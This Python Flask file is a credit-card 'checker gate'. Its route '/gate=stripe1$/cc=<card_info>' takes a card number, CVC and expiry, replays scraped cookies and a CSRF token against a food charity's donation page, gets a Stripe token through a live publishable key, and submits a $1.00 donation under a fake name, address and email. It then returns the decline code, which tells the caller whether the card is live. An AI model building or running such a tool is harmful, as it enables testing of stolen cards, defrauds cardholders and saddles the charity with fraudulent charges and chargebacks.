from flask import Flask, request, jsonify
import requests
import json
import re
from urllib.parse import unquote

app = Flask(__name__)

def process_donation(card_info):
    try:
        # Parse card information from pipe format
        # Expected format: number|cvc|exp_month|exp_year
        card_parts = card_info.split('|')
        
        if len(card_parts) < 4:
            return {
                "error_code": "invalid_card_format",
                "response": {
                    "code": "invalid_card_format",
                    "message": "Card information should be in format: number|cvc|exp_month|exp_year"
                }
            }
        
        card_number = card_parts[0]
        card_cvc = card_parts[1]
        card_exp_month = card_parts[2]
        card_exp_year = card_parts[3]
        
        # Hardcoded values for other fields
        card_name = "ROCKYY"
        card_address_line1 = "15th street"
        card_address_city = "new york"
        card_address_state = "FL"
        card_address_zip = "10080"
        
        # Step 1: Get the donation page to obtain necessary cookies and tokens
        cookies = {
            'exp_last_visit': '1447575505',
            'exp_csrf_token': '0ce603e7af21a5d4394caf0b89bbe897e88d3701',
            '_ga': 'GA1.2.1117915817.1762935509',
            '_gid': 'GA1.2.1658195410.1762935509',
            '__stripe_sid': '01d3f6b5-3d3e-44e0-9948-0d85f5e103de2d8cb2',
            '__stripe_mid': 'a325fa1c-5bb3-4c2a-94e8-ba609c4ef5cf12c1b2',
            'exp_last_activity': '1762935567',
            'exp_tracker': '%7B%220%22%3A%22donate%2Fmoney%22%2C%221%22%3A%22favicon.ico%22%2C%222%22%3A%22donate%2Fmoney%22%2C%223%22%3A%22donate%2Ffood%22%2C%22token%22%3A%22be8bc2cd902727048cb2fbbcd801038f51b93b13a76120f89fead31c27afe2920916b7a7673a979427ab17abafe84304%22%7D',
            '_gat_UA-6832692-28': '1',
            '_ga_QMGKB7VHFP': 'GS2.2.s1762935509$o1$g1$t1762935571$j60$l0$h0',
        }

        headers = {
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'en-US,en;q=0.9',
            'cache-control': 'no-cache',
            'pragma': 'no-cache',
            'priority': 'u=0, i',
            'referer': 'https://www.mannahelps.org/donate/food/',
            'sec-ch-ua': '"Chromium";v="142", "Google Chrome";v="142", "Not_A Brand";v="99"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': 'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Mobile Safari/537.36',
        }

        response = requests.get('https://www.mannahelps.org/donate/money/', cookies=cookies, headers=headers)
        
        # Update cookies from the response
        cookies.update(response.cookies.get_dict())
        
        # Extract CSRF token from the page if needed
        try:
            csrf_token_match = re.search(r'name="csrf_token" value="([^"]+)"', response.text)
            if csrf_token_match:
                csrf_token = csrf_token_match.group(1)
                cookies['exp_csrf_token'] = csrf_token
        except:
            pass

        # Step 2: Create a Stripe token with credit card information
        headers = {
            'accept': 'application/json',
            'accept-language': 'en-US',
            'cache-control': 'no-cache',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://js.stripe.com',
            'pragma': 'no-cache',
            'priority': 'u=1, i',
            'referer': 'https://js.stripe.com/',
            'sec-ch-ua': '"Chromium";v="142", "Google Chrome";v="142", "Not_A Brand";v="99"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-site',
            'user-agent': 'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Mobile Safari/537.36',
        }

        # Use the card information from the API parameter
        data = f'time_on_page=67049&guid=55c950db-485d-4bbe-8c83-e79cb9bf493df4dc3f&muid=a325fa1c-5bb3-4c2a-94e8-ba609c4ef5cf12c1b2&sid=01d3f6b5-3d3e-44e0-9948-0d85f5e103de2d8cb2&key=pk_live_7EhDaYyXbPLKSk9IhDTiU0Kr&payment_user_agent=stripe.js%2F78ef418&card[number]={card_number}&card[cvc]={card_cvc}&card[exp_month]={card_exp_month}&card[exp_year]={card_exp_year}&card[name]={card_name}&card[address_line1]={card_address_line1}&card[address_city]={card_address_city}&card[address_state]={card_address_state}&card[address_zip]={card_address_zip}'

        response = requests.post('https://api.stripe.com/v1/tokens', headers=headers, data=data)
        
        # Extract the Stripe token from the response
        stripe_token = None
        try:
            token_data = response.json()
            stripe_token = token_data.get('id')
        except:
            return {
                "error_code": "token_creation_failed",
                "response": {
                    "code": "token_creation_failed",
                    "message": "Failed to create Stripe token"
                }
            }
        
        # Step 4: Submit the donation form with the Stripe token
        cookies = {
            'exp_last_visit': '1447575505',
            'exp_csrf_token': '0ce603e7af21a5d4394caf0b89bbe897e88d3701',
            '_ga': 'GA1.2.1117915817.1762935509',
            '_gid': 'GA1.2.1658195410.1762935509',
            '__stripe_sid': '01d3f6b5-3d3e-44e0-9948-0d85f5e103de2d8cb2',
            '__stripe_mid': 'a325fa1c-5bb3-4c2a-94e8-ba609c4ef5cf12c1b2',
            'exp_tracker': '%7B%220%22%3A%22donate%2Fmoney%22%2C%221%22%3A%22favicon.ico%22%2C%222%22%3A%22donate%2Fmoney%22%2C%223%22%3A%22donate%2Ffood%22%2C%22token%22%3A%22be8bc2cd902727048cb2fbbcd801038f51b93b13a76120f89fead31c27afe2920916b7a7673a979427ab17abafe84304%22%7D',
            'exp_last_activity': '1762935580',
            '_ga_QMGKB7VHFP': 'GS2.2.s1762935509$o1$g1$t1762935584$j47$l0$h0',
        }

        headers = {
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'en-US,en;q=0.9',
            'cache-control': 'no-cache',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://www.mannahelps.org',
            'pragma': 'no-cache',
            'priority': 'u=0, i',
            'referer': 'https://www.mannahelps.org/donate/money/',
            'sec-ch-ua': '"Chromium";v="142", "Google Chrome";v="142", "Not_A Brand";v="99"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': 'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Mobile Safari/537.36',
        }

        data = [
            ('account', 'Programs/Services'),
            ('amount', 'other'),
            ('amnto-text', '1'),
            ('extra_honor_of', ''),
            ('extra_honor_address', ''),
            ('extra_memory_of', ''),
            ('extra_memory_address', ''),
            ('amnto-text', ''),
            ('name', card_name),
            ('email', 'malcjaviusstorm@gmail.com'),
            ('comfirmAddress', 'malcjaviusstorm@gmail.com'),
            ('phone', '8529637412'),
            ('address_line1', card_address_line1),
            ('address_city', card_address_city),
            ('address_state', card_address_state),
            ('address_zip', card_address_zip),
            ('formID', 'donate'),
            ('csrf_token', '0ce603e7af21a5d4394caf0b89bbe897e88d3701'),
            ('id', 'Manna Donation'),
            ('itemInfo', 'One-Time Donation'),
            ('interval', '1'),
            ('amountInput', '1.00'),
            ('id', 'Payment'),
            ('utm_source', 'null'),
            ('utm_medium', 'null'),
            ('utm_campaign', 'null'),
            ('gclid', 'null'),
            ('stripeToken', stripe_token),  # Use the token from step 2
        ]

        response = requests.post('https://www.mannahelps.org/checkout/payment.php', cookies=cookies, headers=headers, data=data)
        
        # Process the final response
        try:
            # Try to parse JSON response
            response_json = response.json()
            
            # Extract error information if available
            if 'error' in response_json:
                error = response_json['error']
                error_code = error.get('code', '')
                message = error.get('message', '')
                
                # Format as requested
                result = {
                    "error_code": error_code,
                    "response": {
                        "code": error_code,
                        "message": message
                    }
                }
            else:
                # If no error information is available
                result = {
                    "error_code": "",
                    "response": response_json
                }
                
        except json.JSONDecodeError:
            # If response is not JSON, try to extract error information from HTML
            response_text = response.text
            
            # Look for specific error patterns in HTML
            code_match = re.search(r'Code is:([^\n]+)', response_text)
            message_match = re.search(r'Message is:([^\n]+)', response_text)
            
            error_code = code_match.group(1).strip() if code_match else ''
            message = message_match.group(1).strip() if message_match else ''
            
            # Format as requested
            result = {
                "error_code": error_code,
                "response": {
                    "code": error_code,
                    "message": message
                }
            }
            
        return result
        
    except Exception as e:
        return {
            "error_code": "script_error",
            "response": {
                "code": "script_error",
                "message": f"An error occurred during the donation process: {str(e)}"
            }
        }

@app.route('/gate=stripe1$/cc=<card_info>')
def stripe_gate(card_info):
    # URL decode the card info
    card_info = unquote(card_info)
    
    # Process the donation with the provided card information
    result = process_donation(card_info)
    
    # Return the result as JSON
    return jsonify(result)

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=True)
